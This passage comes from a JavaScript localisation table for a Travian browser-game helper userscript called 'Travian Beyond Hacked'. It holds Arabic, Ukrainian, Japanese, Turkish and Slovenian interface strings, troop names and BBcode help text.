	'TAB25': 'عرض إجمالي القوات في القريبة',
	'TAB26': 'عرض نظرة عامة على قرية في جدول',
	'TAB27': 'صورة الخادم الخاص : [ ]<br>صورة خادم ترافيان : [x]',
	'TAB28': 'أدخل رقم ID لعاصمتك (مثال : 13695)\n<br>--> http://-/dorf1.php؟newdid=13695',
	'TAB29': 'عرض الأيقونات الإضافية',
	'TAB30': 'عرض تحليل المعركه',
	'TAB31': 'bbcode عرض مساعدة',
	'TAB32': 'عرض الوان الأنشاء/التطوير الحقول',
	'TAB33': 'عرض المساعدة في تاجر مبادلة',
	'TAB34': 'عرض التقرير السريع',
	'TAB35': 'السرعة الخاصة بك في قفز النوافذ (مثال : 4)',
	'CLEAN': ' نظيف',
	'PAL': 'قصر',
	'RESI': 'السكن',
	'MAN': 'قصر الابطال',
	'USI': 'مستودع الاسلحه',
	'ARM': 'حداد',
	'HOT': 'البلدية',
	'IGMTITLE': 'الموضوع',
	'IGMSENTER': 'المرسل',
	'IGMDATE': 'الوقت',
	'IGMTIME': 'الساعة',
	'IGMOUTPUT': 'عرض محتويات الرسائل',
	'MAXTIME': 'اقصى وقت',
	'LOGIN': 'الدخول',
	'TT': 'هدم المباني',
	'RESS': 'وسائل',
	'DEP': 'تخزين الوسائل',
	'PC': 'نقاط حضاريه',
	'TROP': 'القوات',
	'MINI': 'اقل',
	'ATT': 'الهجمات',
	'CONS': 'البناء',
	'FT': 'حفلة',
	'FT1': 'حفلة صغيرة',
	'FT2': 'حفلة كبيرة',
	'EXT': 'إمتداد',
	'IN': 'في',
	'JUGADOR': 'لاعب',
	'HAB': 'السكان',
	'COORD': 'الاحداثيات',
	'ACCION': 'الأجراءات',
	'MAPSCAN': 'المسح الضوئي للخريطه',
	'AID': 'مساعده',
	'VITS': 'سرعة',
	'CAPA': 'القدرة',
	'DIST': 'المسافة',
	'MP': 'إلى الملاحظات ',
	'UPDATE_CHECK': 'التأكد من النسخه',
	'LAST_VERSION': 'انت تستخدم النسخة الأخيره',
	'NEW_VERSION': 'يوجد نسخه جديدة',
	'UPDATE_NOW': 'تحديث الان',
	'R1': 'جندي أول', // Romans
	'R2': 'حراس الأمبراطور',
	'R3': 'جندي مهاجم',
	'R4': 'فرقة تجسس',
	'R5': 'سلاح الفرسان',
	'R6': 'فرسان قيصر',
	'R7': 'كبش',
	'R8': 'المقلاع الناري',
	'R9': 'حكيم',
	'R10': 'مستوطن',
	'T1': 'مقاتل بهراوة', // Teutons
	'T2': 'مقاتل برمح',
	'T3': 'مقاتل بفأس',
	'T4': 'الكشاف',
	'T5': 'مقاتل القيصر',
	'T6': 'فرسان الجرمان',
	'T7': 'محطمة الابواب',
	'T8': 'المقلاع',
	'T9': 'الزعيم',
	'T10': 'مستوطن',
	'G1': 'الكتيبه', // Gauls
	'G2': 'مبارز',
	'G3': 'المستكشف',
	'G4': 'رعد الجرمان',
	'G5': 'فرسان السلت',
	'G6': 'فرسان الهيدوانر',
	'G7': 'محطمة الابواب الخشبية',
	'G8': 'المقلاع الحربي',
	'G9': 'رئيس',
	'G10': 'مستوطن',
	'N1' : 'الجرذ', //Nature
	'N2' : 'العنكبوت',
	'N3' : 'الثعبان',
	'N4' : 'الخفاش',
	'N5' : 'الخنزير البري',
	'N6' : 'الذئب',
	'N7' : 'الدب',
	'N8' : 'التمساح',
	'N9' : 'النمر',
	'N10' : 'الفيل',
	'LVL': 'المستوى',		// Very important
	'MARC': 'التجار',		// Very important
	'TOTAL': 'المجموع',
	'WASTED_SPACE': 'اهدر الفضاء',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Important',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Text',
	'SAVEREPORT': 'حفظ التقرير',
	'ANONYMIZE': 'مجهول الهوية',
	'LBA0': 'الحجم الاجمالي للهجوم',
	'LBA2': 'الحجم الاجمالي للحمايه من المشاة',
	'LBA3': 'الحجم الاجمالي للحمايه ضد سلاح الفرسان',
	'LBA4': 'الاحصاءات العامة',
	'LBA5': 'فرق من الخسائر',
	'LBA6': 'استهلاك',
	'LBA7': 'اكسب من الابطال',
	'LBA9': 'تعادل خسر في الحبوب',
	'LBA10': 'الاسميه للاستهلاك من الحبوب من قبل الجيش',
	'LBA11': 'لم يكن البطل',
	'LBA12': 'بطل',
	'LBA13': 'كمية من المواد الخام التي تقوم بعيدا',
	'LBA14': 'القدرة القصوى على قيد الحياة',
	'LBA15': 'الهجوم',
	'LBA16': 'الدفاع',
	'LBA17': 'انسخة واذهب الى محاكي المعارك',
	'LBA18': 'لصق',
	'BBC': 'BBcodes يمكن استخدام',
	'BBC_B': '[b]Text[/b] :  عريضة ',
	'BBC_I': '[i]Text[/i] :  مائلة',
	'BBC_U': '[u]Text[/u] :  تحتها خط ',
	'BBC_C': '[c]Text[/c] : توسيط الاحرف',
	'BBC_COLOR': 'color=#0000FF او [color=blue]Text[/color] : الوان ',
	'BBC_URL': '[url]http://url[/url] او [url=http://url]Link text[/url] : الموقع',
	'BBC_IMG': '[img]URL[/img] : الصورة ',
	'THS0': ':حالياً',
	'THS1': ':التالي',
	'THS2': ':تحتاج'
	}
	break;
	case "ua":		// Ukrainian : Отака фiгня, малята )
	var newLang = {
	'ALIANZA': 'Альянс',
	'SIM': 'Симулятор бою',
	'SEGURO': 'Ви впевненi?',
	'MARK': 'Обрати все',
	'PERDIDAS': 'Втрати',
	'RENT': 'Прибуток',
	'SUBIR_NIVEL': 'Пiдвищити рiвень',
	'ALDEA': 'по поселеннях',
	'ATACAR': 'Атакувати',
	'COMERCIAR': 'Вiдправити ресурси',
	'GUARDADO': 'Настройки збережено!',
	'DESP_ABR': 'Mov.',
	'FALTA': 'Наобхiдно',
	'HOY': 'сьогоднi',
	'MANYANA': 'завтра',
	'PAS_MANYANA': 'пiслезавтра',
	'MERCADO': 'Ринок',
	'CUARTEL': 'Казарма',
	'PUNTO': 'Пункт збору',
	'CORRAL': 'Стайня',
	'TALLER': 'Майстерня',
	'ENVIAR': 'Вiдправити ресурси',
	'COMPRAR': 'Купiвля',
	'VENDER': 'Продаж',
	'ENVIAR_IGM': 'Send IGM',
	'LISTO': 'Готово',
	'EL': 'on',
	'A_LAS': 'в',
	'EFICIENCIA': 'Ефективнiсть',
	'NUNCA': 'Нiколи',
	'PC': 'Одиницi культури',
	'FUNDAR': 'Вы можете заснувати або завоювати нове поселення',
	'TIEMPO': 'Час',
	'STAT': 'Статистика',
	'OFREZCO': 'Пропоную',
	'BUSCO': 'Шукаю',
	'TIPO': 'Тип',
	'CUALQUIERA': 'Будь-який',
	'DISPONIBLE': 'Тiльки доступнi (по кiлькостi торговцiв)',
	'SI': 'Так',
	'NO': 'Нi',
	'MARCADORES': 'Закладки',
	'ANYADIR': 'Додати',
	'ENLACE': 'Введiть URL закладки',
	'TEXTO': 'Введите им’я закладки',
	'ARCHIVE': 'Архiв',
	'ELIMINAR': 'Видалити',
	'ACTUALIZAR': 'Поновити',
	'REFRESH_INFORMARION': 'Поновити iнформацiю',
	'RESUMEN': 'Зведення',
	'RECURSO1': 'Дерево',
	'RECURSO2': 'Глина',
	'RECURSO3': 'Залiзо',
	'RECURSO4': 'Зерно',
	'ALDEA_EXTRA1': 'Вiдправити вiйсько',
	'ALDEA_EXTRA2': ' Вiдправити ресурси',
	'ALDEA_EXTRA3': 'Центрувати мапу',
	'ALDEA_EXTRA4': 'View Global on village',
	'ALDEA_EXTRA5': 'Центрувати на поселеннi',
	'ALDEA_EXTRA6': 'Информацiя с TSU',
	'ALDEA_EXTRA6B': 'Информацiя с Travian World Analyzer',
	'ALDEA_EXTRA7': 'Информацiя с Travian-search',
	'ALDEA_EXTRA8': 'Розмiщення на Travmap',
	'ADD_ALL': 'Кожного ресурсу по ',
	'DEMO': 'Знести будiвлю',
	'FRIGO': 'Пошук неактивних',
	'TOOLS': 'Дистанцiя i час',
	'TAB1': 'Для вiдображення на Travmap (червона iконка) кiлькох альянсiв, введiть iх назви через кому.(напр.: A,B,C)',
	'TAB2': 'Редагувати закладки',
	'TAB3': 'Вмiст блокноту',
	'TAB4': 'Своi пропозицii на ринку',
	'TAB5': 'Таблиця апгрейду шахт та ферм внизу строрiнки (0 або 1)',
	'TAB6': 'Таблиця апгрейду внутрiшнiх будiвель внизу строрiнки (0 або 1)',
	'TAB7': ' Вiдображати лiчильники ресурсiв (0 або 1)',
	'TAB8': 'Закладки: палац i резиденцiя (0 або 1)',
	'TAB9': 'Закладки: каразма, стайня i майстерня (0 або 1)',
	'TAB10': 'Закладки: кузнi зброi та обладункiв (0 або 1)',
	'TAB11': 'Закладки: таверна (0 або 1)',
	'TAB12': 'Показувати закладки',
	'TAB13': 'Показувати посилання на TSU (0 або 1)',
	'TAB13B': 'Показувати посилання на Travian World Analyzer (0 або 1)',
	'TAB14': 'Показувати посилання на Travian-search (0 або 1)',
	'TAB15': 'Показувати рiвнi будiвель всерединi поселення (0 або 1)',
	'TAB16': ' Показувати текст всiх повiдомлень (0 або 1)',
	'TAB17': ' Показувати блокнот (0 або 1)',
	'TAB18': ' Показувати посилання на Travmap (0 або 1)',
	'TAB19': 'Закладки: ратуша (0 або 1)',
	'TAB20': 'Скорочений перелiк посилань в лiвiй частинi сторiнки (0 або 1)',
	'TAB21': 'Спрощений вид статистики в зведеннi по селах (0 або 1)',
	'TAB22': 'Перемiстити вгору таблицю статистики в зведеннi по селах (0 або 1)',
	'TAB23': 'Атака за замовчанням: Розбійницький набіг / Звичайна (0 або 1)',
	'TAB24': 'Лічильник ресурсів зверху чи знизу(1 або 0)',
	'TAB25': 'Показувати ВСІ війська поселення (0 або 1)',
	'CLEAN': ' Очистити',
	'PAL': 'Палац',
	'RESI': 'Резиденцiя',
	'MAN': 'Таверна',
	'USI': 'Кузня обладункiв',
	'ARM': 'Кузня зброї',
	'HOT': 'Ратуша',
	'IGMTITLE': 'Тема',
	'IGMSENTER': 'Вiдправник',
	'IGMDATE': 'Дата',
	'IGMTIME': 'Час',
	'IGMOUTPUT': 'Текст всiх повiдомлень',
	'MAXTIME': 'Максимальний час',
	'LOGIN': 'Вхiд',
	'TT': 'Огляд',
	'RESS': 'Ресурси на складах',
	'DEP': 'Завантаженiсть складiв (%)',
	'PC': 'ОК',
	'TROP': 'Вiйська',
	'MINI': 'Мiнi-огляд',
	'ATT': 'Атаки',
	'CONS': 'Будiвництво',
	'FT': 'Свята',
	'FT1': 'свято',
	'FT2': 'торжество',
	'EXT': 'Продовження',
	'IN': 'в',
	'MAPSCAN': 'Сканувати мапу',
	'JUGADOR': 'Гравець',
	'HAB': 'Населення',
	'COORD': 'Координати',
	'ACCION': 'Дii',
	'AID': 'Допомога',
	'VITS': 'Швидкiсть',
	'CAPA': 'Вантажопiдйомнiсть',
	'DIST': 'Вiдстань',
	'MP': 'Додати посилання',
	'UPDATE_CHECK': 'Перевiрити оновлення',
	'LAST_VERSION': 'У вас остання доступна версiя ',
	'NEW_VERSION': 'Нова версiя доступна',
	'UPDATE_NOW': 'Оновити зараз',
	'R1': 'Легiонер', //romain
	'R2': 'Преторiанець',
	'R3': 'Iмперiанець',
	'R4': 'Кiнний розвiдник',
	'R5': 'Кiннота iмператора',
	'R6': 'Кiннота Цезаря',
	'R7': 'Таран',
	'R8': 'Вогняна катапульта',
	'R9': 'Сенатор',
	'R10': 'Поселенець',
	'T1': 'Дубинник', //teuton
	'T2': 'Списник',
	'T3': 'Сокирщик',
	'T4': 'Скаут',
	'T5': 'Паладин',
	'T6': 'Тевтонський вершник',
	'T7': 'Стiнобитне знаряддя',
	'T8': 'Катапульта',
	'T9': 'Ватажок',
	'T10': 'Поселенець',
	'G1': 'Фаланга', //gaulois
	'G2': 'Мечник',
	'G3': 'Слiдопит',
	'G4': 'Тевтацький грiм',
	'G5': 'Друiд-вершник',
	'G6': 'Едуйська кiннота',
	'G7': 'Таран',
	'G8': 'Катапульта',
	'G9': 'Лiдер',
	'G10': 'Поселенець',
	'N1': 'Пацюк', //nature
	'N2': 'Павук',
	'N3': 'Змiя',
	'N4': 'Кажан',
	'N5': 'Кабан',
	'N6': 'Вовк',
	'N7': 'Ведмiдь',
	'N8': 'Крокодил',
	'N9': 'Тигр',
	'N10': 'Слон',
	'LVL': 'Рівень',
	'MARC': 'Торговці'
	}
	break;
	case "jp":		// japon - Jackie Jack
	var newLang = {
	'ALIANZA': '同盟',
	'SIM': '戦闘シミュレーション',
	'SEGURO': '確かですか？',
	'MARK': 'すべて選択',
	'PERDIDAS': '損失',
	'RENT': '利益',
	'SUBIR_NIVEL': '準備完了',
	'ALDEA': '',
	'ATACAR': '攻撃',
	'COMERCIAR': '資源の送付',
	'GUARDADO': '保存',
	'DESP_ABR': 'Mov.',
	'FALTA': '不足資源',
	'HOY': '今日',
	'MANYANA': '明日',
	'PAS_MANYANA': '明後日',
	'MERCADO': '市場',
	'CUARTEL': '兵舎',
	'PUNTO': '集兵所',
	'CORRAL': '馬舎',
	'TALLER': '作業場',
	'ENVIAR': '資源の送付',
	'COMPRAR': '買方',
	'VENDER': '売方',
	'ENVIAR_IGM': 'メッセージを送る',
	'LISTO': '準備完了予定',
	'EL': ' ',
	'A_LAS': ' ',
	'EFICIENCIA': '積載率',
	'NUNCA': '決してない',
	'PC': '文化ポイント',
	'STAT': '統計',
	'OFREZCO': '売方',
	'BUSCO': '作物ファインダー ',
	'TIPO': '取引比率',
	'CUALQUIERA': '全て',
	'DISPONIBLE': '取引可能',
	'MARCADORES': 'ブックマーク',
	'ANYADIR': '追加',
	'ENLACE': '新しいブックマークのURL',
	'TEXTO': '新しいブックマークの名前',
	'ARCHIVE': '書庫',
	'ELIMINAR': '取消',
	'ACTUALIZAR': '更新',
	'REFRESH_INFORMARION': '情報更新',
	'RESUMEN': '村の概要',
	'RECURSO1': 'きこり',
	'RECURSO2': '粘土',
	'RECURSO3': '鉄',
	'RECURSO4': '穀物',
	'ALDEA_EXTRA1': '出兵',
	'ALDEA_EXTRA2': '資源の送付',
	'ALDEA_EXTRA3': '地図の中心に表示',
	'ALDEA_EXTRA4': '村の概観を表示',
	'ALDEA_EXTRA5': '村の中心を表示',
	'ADD_ALL': '全て',
	'DEMO': '取壊',
	'TOOLS': '距離と時間',
	'TAB1': '指定した同盟を色分け表示します。(ex: A,B,C)',
	'TAB2': 'ブックマークの編集',
	'TAB3': 'Notepadの内容',
	'TAB4': '市場での販売数、価格の設定',
	'TAB5': '資源テーブルの表示、非表示',
	'TAB6': '建設テーブルの表示、非表示',
	'TAB7': '資源カウンターの表示、非表示',
	'TAB8': '既定ブックマークの表示、非表示（管理用）',
	'TAB9': '既定ブックマークの表示、非表示（兵舎、馬舎、作業場）',
	'TAB10': '既定ブックマークの表示、非表示（鍛冶場、防具工場）',
	'TAB11': '既定ブックマークの表示、非表示（宮殿、官邸）',
	'TAB12': '既定ブックマークの表示、非表示（本部）',
	'TAB13': '「TSU [TSU] 」のリンクボタンの表示、非表示',
	'TAB13B': '「Travian World Analyzer [Travian World Analyzer ] 」のリンクボタンの表示、非表示',
	'TAB14': '「Travian-Search [travian-search (JP鯖未対応)] 」のリンクボタンの表示、非表示',
	'TAB15': '建物のレベル表示を行う',
	'TAB16': '一覧のメッセージを一括表示',
	'TAB17': 'Notepadの表示、非表示',
	'TAB18': '「Travmap [Localisation sur carte (JP鯖未対応)] 」サイトへのリンクの表示',
	'TAB19': 'ブックマークに本部を表示',
	'TAB20': '左側リンク表示の簡素化',
	'TAB21': '村の概要を簡素化します。',
	'TAB22': '村の概要の位置を変更。',
	'TAB23': '攻撃種別 通常/奇襲',
	'TAB24': '資源カウンター表示位置の変更',
	'TAB25': '集兵所で村の兵士全てを表示する',
	'CLEAN': ' 削除',
	'PAL': '宮殿',
	'RESI': '官邸',
	'MAN': '英雄の館',
	'USI': '防具工場',
	'ARM': '鍛冶場',
	'HOT': '本部',
	'IGMTITLE': '題名',
	'IGMSENTER': '送付者',
	'IGMDATE': '日付',
	'IGMTIME': '時間',
	'IGMOUTPUT': 'メッセージの内容を表示',
	'MAXTIME': '最大時間',
	'LOGIN': 'Login',
	'TT': '概要',
	'RESS': '資源',
	'DEP': '倉庫容量',
	'PC': 'PC',
	'TROP': '兵士',
	'MINI': 'Mini',
	'ATT': '攻撃',
	'CONS': '建設',
	'FT': 'お祭り',
	'FT1': '小さいお祭り',
	'FT2': '大きなお祭り',
	'EXT': '拡張子',
	'IN': 'in',
	'JUGADOR': 'プレーヤー',
	'HAB': '人口',
	'COORD': '座標',
	'ACCION': 'Actions',
	'MAPSCAN': 'Scan map',
	'AID': 'Aide',
	'VITS': '速度',
	'CAPA': '積載量',
	'DIST': '距離',
	'MP': 'ブックマークに保存',
	'R1': 'レジョネア', //Romans
	'R2': 'プレトリアン',
	'R3': 'インペリアン',
	'R4': 'エクイーツ・レガティ',
	'R5': 'エクイーツ・インペラトリス',
	'R6': 'エクイーツ・カエザリス',
	'R7': 'バッテリング・ラム',
	'R8': 'ファイヤーカタパルト',
	'R9': '議員',
	'R10': '開拓者',
	'T1': 'クラブスインガー', //Teutons
	'T2': 'スピアマン',
	'T3': 'アックスマン',
	'T4': 'スカウト',
	'T5': 'パラディン',
	'T6': 'チュートニック・ナイト',
	'T7': 'ラム',
	'T8': 'カタパルト',
	'T9': '元首',
	'T10': '開拓者',
	'G1': 'ファランクス', //Gauls
	'G2': 'ソードマン',
	'G3': 'パスファインダー',
	'G4': 'シューテイタス・サンダー',
	'G5': 'ドルイドライダー',
	'G6': 'ヘジュアン',
	'G7': 'ラム',
	'G8': 'トレブジェ',
	'G9': '首領',
	'G10': '開拓者',
	'N1': '鼠', //Nature
	'N2': '蜘蛛',
	'N3': '蛇',
	'N4': '蝙蝠',
	'N5': '猪',
	'N6': '狼',
	'N7': '熊',
	'N8': '鰐',
	'N9': '虎',
	'N10': '象',
	'LVL': 'レベル',
	'MARC': '商人'
	}
	break;
	case "tr":		// Turkish translate - greench
	var newLang = {
	'ALIANZA': 'Birlik',
	'SIM': 'SavaşHesaplayıcı',
	'SEGURO': 'Emin misiniz?',
	'MARK': 'Tümünü seç',
	'PERDIDAS': 'Kayıp',
	'RENT': 'Kazanılan',
	'SUBIR_NIVEL': 'Bir üst seviyeye geliştirilebilir',
	'ALDEA': 'Köy adı',
	'ATACAR': 'Saldırı',
	'COMERCIAR': 'Hammadde gönder',
	'GUARDADO': 'Kaydedildi.',
	'DESP_ABR': 'Har.',
	'FALTA': 'İhtiyacınız olan:',
	'HOY': 'bugün',
	'MANYANA': 'yarın',
	'PAS_MANYANA': 'ertesi gün',
	'MERCADO': 'Market',
	'CUARTEL': 'Kışla',
	'PUNTO': 'Askeri Üs',
	'CORRAL': 'Ahır',
	'TALLER': 'Tamirhane',
	'ENVIAR': 'Hammadde gönder',
	'COMPRAR': 'Satın Al',
	'VENDER': 'Sat',
	'ENVIAR_IGM': 'Destek Gönder',
	'LISTO': 'Hazır olduğu',
	'EL': 'gün',
	'A_LAS': 'saat',
	'EFICIENCIA': 'Verim',
	'NUNCA': 'Hiç',
	'PC': 'kültür puanı',
	'FUNDAR': 'yeni bir köy kurabilir ve ya fetih edebilirsiniz.',
	'TIEMPO': 'Zaman',
	'STAT': 'İstatistik',
	'OFREZCO': 'Önerilen',
	'BUSCO': 'İstenen',
	'TIPO': 'Oran',
	'CUALQUIERA': 'Herhangi biri',
	'DISPONIBLE': 'Sadece imkanlı olanlar',
	'SI': 'Evet',
	'NO': 'Hayır',
	'MARCADORES': 'Yerimleri',
	'ANYADIR': 'Ekle',
	'ENLACE': 'Yeni yerimi adresi',
	'TEXTO': 'Yeni yerimi yazısı',
	'ARCHIVE': 'Arşiv',
	'ELIMINAR': 'Kaldır',
	'ACTUALIZAR': 'yenile',
	'REFRESH_INFORMARION': 'bilgileri yenile',
	'RESUMEN': 'Özet',
	'RECURSO1': 'Odun',
	'RECURSO2': 'Tuğla',
	'RECURSO3': 'Demir',
	'RECURSO4': 'Tahıl',
	'ALDEA_EXTRA1': 'Asker gönder',
	'ALDEA_EXTRA2': 'Hammadde gönder',
	'ALDEA_EXTRA3': 'Haritada ortala',
	'ALDEA_EXTRA4': 'Köyde genel görünüş',
	'ALDEA_EXTRA5': 'Köy merkezi',
	'ALDEA_EXTRA6': 'TSU Bilgisi',
	'ALDEA_EXTRA6B': 'Travian World Analyzer Bilgisi',
	'ALDEA_EXTRA7': 'Travian-arama bilgisi',
	'ALDEA_EXTRA8': 'Travmap da yeri',
	'ADD_ALL': 'Tümü için ',
	'DEMO': 'Bina Yıkımı',
	'FRIGO': 'Kaynak',
	'TOOLS': 'Uzaklık-Zaman',
	'TAB1': 'Travmap deki yerleşim için (kırmızı), birlikleri virgülle ayırın. (ör: A,B,C)',
	'TAB2': 'Yerimlerini düzenle',
	'TAB3': 'Not Defteri',
	'TAB4': 'Market Satış Fiyatları',
	'TAB5': 'Hammadde inşaatlarının tablosunu göster',
	'TAB6': 'İnşaat tablosunu göster',
	'TAB7': 'Saatlik üretimi ve deponun taşma süresini göster',
	'TAB8': 'Yönetim binaları yerimleri',
	'TAB9': 'Askeri binaların yerimleri',
	'TAB10': 'Geliştirme binalarının yerimleri',
	'TAB11': 'Perso Mik yerimleri',
	'TAB12': 'Yerimlerini göster',
	'TAB13': 'TSU bilgisini göster',
	'TAB13B': 'Travian World Analyzer bilgisini göster',
	'TAB14': 'Travian-search bilgisini göster',
	'TAB15': 'Bina seviyesini göster',
	'TAB16': 'İletilerin içeriğini göster',
	'TAB17': 'Not defteri ve iletiyi göster',
	'TAB18': 'Travmap bilgisini göster',
	'TAB19': 'Merkez binasının yerimi',
	'TAB20': 'Soldaki bağlantıların listesini basitleştir',
	'TAB21': 'Köylerin özetini basitleştir',
	'TAB22': 'Köy özetinin yeri',
	'TAB22': 'Travian Plusa sahipseniz [x] yazın, değilseniz [ ] yazın.',
	'TAB23': 'Saldırı: Yağma / Saldırı: Normal',
	'TAB24': 'Saatlik üretimin sayısının yeri',
	'TAB25': 'Askeri üste köye ait tüm askerini göster',
	'TAB26': 'Köyü özeti tablosunu göster',
	'TAB27': 'Özel resim sunucusu : [ ] Travian resim sunucusu : [x]',
	'CLEAN': ' Temizle',
	'PAL': 'Saray',
	'RESI': 'Köşk',
	'MAN': 'Kahraman Kışlası',
	'USI': 'Zırh Dökümhanesi',
	'ARM': 'Silah Dökümhanesi',
	'HOT': 'Belediye',
	'IGMTITLE': 'Başlık',
	'IGMSENTER': 'gönderen',
	'IGMDATE': 'tarih',
	'IGMTIME': 'zaman',
	'IGMOUTPUT': 'iletilerin içeriklerini göster',
	'MAXTIME': 'En fazla zaman',
	'LOGIN': 'Giriş',
	'TT': 'Tam görünüm',
	'RESS': 'Hammadde',
	'DEP': 'Depo',
	'PC': 'KP',
	'TROP': 'Destek',
	'MINI': 'Ufak',
	'ATT': 'Saldırılar',
	'CONS': 'İnşaatlar',
	'FT': 'Kutlama',
	'FT1': 'Küçük kutlama',
	'FT2': 'Büyük kutlama',
	'EXT': 'Yükseltme',
	'IN': ' ',
	'MAPSCAN': 'Haritayı Tara',
	'HIDEINFO': 'Kaynak Bilgisini Gizle',
	'SHOWINFO': 'Kaynak Bilgisini Göster',
	'JUGADOR': 'Oyuncu',
	'ACCION': 'Hareket',
	'HAB': 'Nüfus',
	'COORD': 'Koordinat',
	'R1': 'Lejyoner', //Romalılar
	'R2': 'Pretoryan',
	'R3': 'Emperyan',
	'R4': 'Equites Legati',
	'R5': 'Equites Imperatoris',
	'R6': 'Equites Caesaris',
	'R7': 'Koçbaşı',
	'R8': 'Ateş Mancınığı',
	'R9': 'Senatör',
	'R10': 'Göçmen',
	'T1': 'Topmak Sallayan', //Cermenler
	'T2': 'Mızrakçı',
	'T3': 'Balta Sallayan',
	'T4': 'Casus',
	'T5': 'Paladin',
	'T6': 'Toyton',
	'T7': 'Koçbaşı',
	'T8': 'Mancınık',
	'T9': 'Reis',
	'T10': 'Göçmen',
	'G1': 'Phalanx', //Galyalılar
	'G2': 'kılıçlı',
	'G3': 'Casus',
	'G4': 'Toytatın Şimşeği',
	'G5': 'Druyid',
	'G6': 'Heduan',
	'G7': 'Koçbaşı',
	'G8': 'Mancınık',
	'G9': 'Kabile Reisi',
	'G10': 'Göçmen',
	'N1': 'Sıçan', //Doğa
	'N2': 'Örümcek',
	'N3': 'Yılan',
	'N4': 'Yarasa',
	'N5': 'Yaban Domuzu',
	'N6': 'Kurt',
	'N7': 'Ayı',
	'N8': 'Timsah',
	'N9': 'Kaplan',
	'N10': 'Fil',
	'AID': 'Yardım',
	'VITS': 'Hız',
	'CAPA': 'Kapasite',
	'DIST': 'Uzaklık',
	'MP': 'Yerimi ',
	'UPDATE_CHECK': 'Sürüm denetle',
	'LAST_VERSION': 'Son sürümü kullanıyorsunuz',
	'NEW_VERSION': 'Daha yeni bir sürüm mevcut',
	'UPDATE_NOW': 'Şimdi güncelle',
	'LVL': 'seviye',
	'MARC': 'Satıcı',
	'TOTAL': 'Toplam',
	'WASTED_SPACE' : 'Boş Alan',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Önemli Ayarlamalar (0/1)',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Yazıları',
	'SAVEREPORT': 'raporu kaydet',
	'ANONYMIZE': 'adsız',
	'LBA0':'Saldırı büyüklüğü',
	'LBA2':'Yaya askere karşı toplam savunma gücü',
	'LBA3':'Süvariye karşı toplam savunma gücü',
	'LBA4':'Genel istatistik',
	'LBA5':'Kayıplar farkı',
	'LBA6':'Tüketim',
	'LBA7':'Kh. tecrübesi',
	'LBA9':'Tahıl olarak eşdeğer kayıp',
	'LBA10':'Ordunun tahıl tüketimi',
	'LBA11':'Kahraman yok',
	'LBA12':'Kh.',
	'LBA13':'Hammadde taşıma miktarı',
	'LBA14':'En yüksek kapasite',
	'LBA15':'Saldıran',
	'LBA16':'Savunan',
	'BBC': 'Kullanılabilir BB kodları',
	'BBC_B': 'Kalın: [b]Yazı[/b]',
	'BBC_I': 'Eğik: [i]Yazı[/i]',
	'BBC_U': 'Altı Çizgili: [u]Yazı[/u]',
	'BBC_C': 'Ortala: [c]Yazı[/c]',
	'BBC_COLOR': 'Renkler: [color=blue]Yazı[/color] İpucu: Şunları da kullanabilirsiniz: color=#0000FF ve #00F',
	'BBC_URL': 'Bağlantı: [url]http://adres[/url] ya da [url=http://adres]Bağlantı yazısı[/url]'
	}
	break;
	case "si": 		// Tranlation by BmW		// Prevod by BmW
	var newLang = {
	'ALIANZA': 'Aliansa',
	'SIM': 'Simulator bitk',
	'SEGURO': 'Ali ste prepričani?',
	'MARK': 'Izberi vse',
	'PERDIDAS': 'Izguba',
	'RENT': 'Profit',
	'SUBIR_NIVEL': 'Nadgradnja možna',
	'ALDEA': 'Naselbine',
	'ATACAR': 'Napadi',
	'COMERCIAR': 'Pošlji surovine',
	'GUARDADO': 'Shranjeno',
	'DESP_ABR': 'Pomik',
	'FALTA': 'Manjka',
	'HOY': 'Danes',
	'MANYANA': 'Jutri',
	'PAS_MANYANA': 'Pojutrišnjem',
	'MERCADO': 'Tržnica',
	'CUARTEL': 'Barake',
	'PUNTO': 'Zbirališče',
	'CORRAL': 'Konjušnica',
	'TALLER': 'Izdelovalec oblegovalnih naprav',
	'ENVIAR': 'Pošlji surovine',
	'COMPRAR': 'Kupi',
	'VENDER': 'Ponudi',
	'ENVIAR_IGM': 'Pošlji sporočilo',
	'LISTO': 'Na voljo',
	'EL': '',
	'A_LAS': 'ob',
	'EFICIENCIA': 'Izkoristek',
	'NUNCA': 'Nikoli',
	'PC': 'Kulturne točke',
	'FUNDAR': 'Lahko zgradite ali zasedete novo vas',
	'TIEMPO': 'Čas',
	'STAT': 'Statistika',
	'OFREZCO': 'Ponuja',
	'BUSCO': 'Išči',
	'TIPO': 'Tip',
	'CUALQUIERA': 'Karkoli',
	'DISPONIBLE': 'Samo možne ponudbe',
	'SI': 'Da',
	'NO': 'Ne',
	'MARCADORES': 'Zaznamki',
	'ANYADIR': 'Dodaj',
	'ENLACE': 'URL novega zaznamka',
	'TEXTO': 'Ime novega zaznamka',
	'ARCHIVE': 'Arhiv',
	'ELIMINAR': 'Izbriši',
	'ACTUALIZAR': 'Osveži',
	'REFRESH_INFORMARION': 'Osveži',
	'RESUMEN': 'Pregled',
	'RECURSO1': 'Les',
	'RECURSO2': 'Glina',
	'RECURSO3': 'Železo',
	'RECURSO4': 'Žito',
	'ALDEA_EXTRA1': 'Pošlji enote',
	'ALDEA_EXTRA2': 'Pošlji surovine',
	'ALDEA_EXTRA3': 'Center mape',
	'ALDEA_EXTRA4': 'Globalen pogled na vas', // Napačno?
	'ALDEA_EXTRA5': 'Centriraj vas',
	'ALDEA_EXTRA6': 'Info. TSU',
	'ALDEA_EXTRA6B': 'Info. Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info. Travian-search',
	'ALDEA_EXTRA8': 'Lokacija na Travmap',
	'ADD_ALL': 'Za vse ',
	'DEMO': 'Podri stavbo',
	'FRIGO': 'Frigo', // Napačno?
	'TOOLS': 'Razdalje in časi',
	'TAB1': 'Pri lokaciji na Travmap (rdeče), se več alians loči z vejico.(npr.: A,B,C)',
	'TAB2': 'Urejanje Zaznamkov',
	'TAB3': 'Zapiski',
	'TAB4': 'Prodajne cene v Tržnici',
	'TAB5': 'Tabela za polja',
	'TAB6': 'Tabela za zgradbe',
	'TAB7': 'Prikaži števec surovin',
	'TAB8': 'Zaznamki za Palačo,Rezidenco,Herojevo rezidenco',
	'TAB9': 'Zaznamki za vojaške zgradbe',
	'TAB10': 'Zaznamki za zgradbe za izboljšavo',
	'TAB11': 'Zaznamki po meri',
	'TAB12': 'Prikaži Zaznamke',
	'TAB13': 'Prikaži Info. TSU',
	'TAB13B': 'Prikaži Info. Travian World Analyzer',
